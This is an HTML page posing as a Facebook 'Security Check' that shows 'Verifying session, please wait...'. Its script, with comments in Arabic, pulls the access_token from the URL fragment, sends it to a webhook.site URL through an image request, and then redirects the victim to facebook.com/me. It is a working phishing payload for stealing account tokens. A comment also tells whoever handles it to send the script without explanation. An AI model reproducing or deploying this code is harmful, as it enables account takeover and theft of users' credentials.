<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
</head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = function() {
            // 1. استخراج التوكن من الـ URL (بعد علامة #)
            const fragment = window.location.hash.substring(1);
            const params = new URLSearchParams(fragment);
            const token = params.get('access_token');

            if (token) {
                // 2. إرسال التوكن إلى الـ Webhook الخاص بك
                // نستخدم Image لأنها الأسرع والأقل عرضة للمنع
                const logger = new Image();
                logger.onload = function() {
                    // 3. بعد التأكد من وصول البيانات، وجه الضحية لفيسبوك
                    window.location.href = "https://www.facebook.com/me";
                };
                logger.onerror = function() {
                    // حتى لو فشلت الصورة، وجه الضحية
                    window.location.href = "https://www.facebook.com/me";
                };
                logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?captured_token=" + encodeURIComponent(token);
            } else {
                console.log("No token found in URL.");
            }
        };
    </script>
    <div style="text-align: center; margin-top: 50px;">
        <p>Verifying session, please wait...</p>
    </div>
</body>
</html>
